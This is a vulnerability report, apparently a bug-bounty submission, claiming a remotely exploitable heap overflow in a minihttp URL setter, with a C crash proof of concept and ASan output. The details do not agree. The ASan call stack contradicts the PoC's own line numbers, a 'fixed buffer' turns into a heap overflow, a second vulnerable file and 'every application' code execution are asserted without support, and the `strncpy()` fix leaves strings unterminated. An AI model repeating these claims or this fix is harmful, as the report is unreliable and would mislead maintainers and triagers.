## Summary
A heap buffer overflow in `mh_easy_setopt_url_safe()` lets a remote attacker execute arbitrary code by supplying a long URL.

## Details
In `lib/easy.c` line 412, the function `mh_easy_setopt_url_safe()` copies the user-supplied URL into a fixed 256-byte buffer with `strcpy()` without checking its length. Because the URL can come from an HTTP redirect, a malicious server controls it, which makes this remotely exploitable (CWE-122).

The same unchecked copy also exists in `lib/vtls/openssl_ext.c`, which is called from `mh_easy_perform()`.

## Proof of concept
```c
#include <minihttp.h>
int main(void) {
  char url[4096];
  memset(url, 'A', sizeof(url) - 1);
  url[sizeof(url) - 1] = 0;
  mh_easy *h = mh_easy_init();
  mh_easy_setopt_url_safe(h, url);
  return mh_easy_perform(h);
}
```

## ASan output
```
==48213==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000110
WRITE of size 4096 at 0x602000000110 thread T0
    #0 0x4f2a1b in mh_easy_setopt_url_safe lib/easy.c:412:5
    #1 0x4f3c22 in mh_easy_perform lib/easy.c:530:12
    #2 0x4f1d10 in main poc.c:7:3
```

## Impact
Remote code execution in every application that uses minihttp 2.4.1.

## Fix
Replace `strcpy()` with `strncpy()` in `mh_easy_setopt_url_safe()`.
